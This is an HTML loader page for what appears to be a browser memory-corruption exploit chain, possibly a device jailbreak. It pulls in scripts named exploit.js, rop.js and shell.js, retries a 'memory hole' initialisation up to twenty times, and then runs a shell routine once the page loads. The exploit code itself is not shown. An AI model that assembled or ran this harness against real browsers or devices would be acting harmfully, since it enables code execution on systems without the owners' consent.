<html>
<body>
<script src="include/exploit.js"></script>
<script src="include/jquery.min.js"></script>
<script src="include/lib.js"></script>
<script src="include/rop.js"></script>
<script src="include/functions.js"></script>
<script src="include/shell.js"></script>
<script src="include/utils.js"></script>

<script type="text/javascript">
var delayedScripts;
var delayedScriptsLoaded = 0;

// Global vars
var log_out_filepath = "log.txt"; // Comment out to disable log_out.
var _gc, _cnt = 0;

/*
   Main
*/
$(document).ready(function() {
    try
	{
        var found = 0;
        for (var i = 0; i < 20; i++)
		{
            var res = initMemoryHole(true);
            if (res != -1)
			{ 
				found = 1;
				break
			};
        }

        if (found == 0)
		{
            logdbg("Initialization failed!");
            return;
        }
		
		delayedScripts = [
			"include/js-struct.js",
			"include/functions_ex.js",
			"include/tests.js"
		]
        
        for (var i = 0; i < delayedScripts.length; ++i)
        {
            var script = delayedScripts[i];
            $.get(script, function(data) {
                try
				{
					logdbg("Loaded " + delayedScripts[delayedScriptsLoaded] + " (" + (delayedScriptsLoaded + 1).toString() + "/" + delayedScripts.length.toString() + ")");
					if (++delayedScriptsLoaded == delayedScripts.length)
					{
						Run_Test();
						shell(aspace);
					}
				}
				catch(e) 
				{
                    logdbg("getScript Error: " + e);
                }
            });
        }
    }
	catch(e)
	{
        logdbg("MainError: " + e);
    }
});
</script>

<div id="log"></div>
</body>
</html>
